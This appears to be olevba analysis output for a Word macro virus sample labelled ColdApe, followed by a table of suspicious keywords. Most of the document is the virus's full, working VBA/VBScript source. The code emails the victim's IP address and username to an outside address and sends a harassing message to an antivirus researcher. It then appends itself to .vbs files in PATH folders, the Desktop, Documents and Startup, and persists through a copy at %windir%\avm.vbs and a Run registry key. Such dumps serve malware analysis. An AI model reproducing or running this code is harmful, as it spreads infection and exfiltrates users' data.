olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ColdApe-707b8ec32d3e8569f2489c97a1a13491e7348836
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.ColdApe-707b8ec32d3e8569f2489c97a1a13491e7348836 
in file: Virus.MSWord.ColdApe-707b8ec32d3e8569f2489c97a1a13491e7348836 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim theApp, theNameSpace, theMailItem
Dim IPSocket
On Error Resume Next
Set IPSocket = CreateObject("MSWinsock.Winsock")
IPADDY = IPSocket.LocalIP
set BOB = CreateObject("Wscript.Network")
For x = 1 To 2
If x = 1 Then EMADDY = "avm@nym.alias.net" Else EMADDY = "nick@virusbtn.com"
if x = 1 then MSGBDY = IPADDY else MSGBDY = "Dear Nicky... my name is Jason N. Yap and I want to make hot monkey love with you. You anti-virus stud!"
Set theApp = WScript.CreateObject("Outlook.Application")
Set theNameSpace = theApp.GetNameSpace("MAPI")
theNameSpace.Logon "profile", "password"
Set theMailItem = theApp.CreateItem(0)
theMailItem.Recipients.Add EMADDY
theMailItem.Subject = BOB.Username
theMailItem.Body = MSGBDY
theMailItem.Send
theNameSpace.Logoff
Next
'�

On Error Resume Next
Dim IV6, U187, IV7, IV1, IV2, IV3, IV4
Dim T111
Dim IV5(200)
Dim XR
Set WSHShell = Wscript.CreateObject("Wscript.Shell")
Set WshSysEnv = WSHShell.Environment("Process")
IV10 = WshSysEnv("Path")
IV7 = WSHShell.ExpandEnvironmentStrings("%windir%\avm.vbs")
IV1 = Wscript.ScriptFullName
Set IV6 = CreateObject("Scripting.FileSystemObject")
XR = 1
T11 = Wscript.ScriptFullName
For x = Len(IV10) To 1 Step -1
IV4 = Mid(IV10, x, 1)
If IV4 <> ";" Then
IV5(XR) = IV4 + IV5(XR)
ElseIf IV4 = ";" Then
IV5(XR) = IV5(XR) + "\"
XR = XR + 1
End If
Next
IV5(XR) = IV5(XR) + "\"
IV5(XR + 1) = WSHShell.SpecialFolders("Desktop") + "\"
IV5(XR + 2) = WSHShell.SpecialFolders("MyDocuments") + "\"
IV5(XR + 3) = WSHShell.SpecialFolders("Startup") + "\"
IV5(XR + 4) = Left(T11, InStrRev(T11, "\"))
Set TS = IV6.OpenTextFile(T11, 1)
IV9 = TS.ReadAll
TS.Close
IV8 = Chr(167)
endIV8 = "'" & IV8
For x = Len(IV9) To 1 Step -1
If Mid(IV9, x, 1) = IV8 Then
x = 1
IV3 = endIV8 + IV3
ElseIf Mid(IV9, x, 1) <> IV8 Then
IV3 = Mid(IV9, x, 1) + IV3
End If
Next
For y = 1 To (XR + 4)
For Each Target In IV6.GetFolder(IV5(y)).Files
If UCase(Right(Target.Name, 3)) = "VBS" Then
IV11 = ""
Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 1)
IV11 = TS.ReadAll
TS.Close
If mid(IV11,(len(IV11)-2),1) <> "�" Then
Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 8)
TS.Write IV3
TS.Close
End If
End If
Next
Next
FIV11 (IV7)
If T111 = False Then
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVM", IV7
Set U187 = IV6.OpenTextFile(IV7, 2, True)
U187.Write IV3
U187.Close
End If
Function FIV11(filespec)
Set IV6 = CreateObject("Scripting.FileSystemObject")
If (IV6.FileExists(filespec)) Then
T111 = True
Else
T111 = False
End If
End Function
' Nick "The Love Monkey" Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia
'�
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|ExpandEnvironmentStr|May read system environment variables        |
|          |ings                |                                             |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |avm.vbs             |Executable file name                         |
+----------+--------------------+---------------------------------------------+
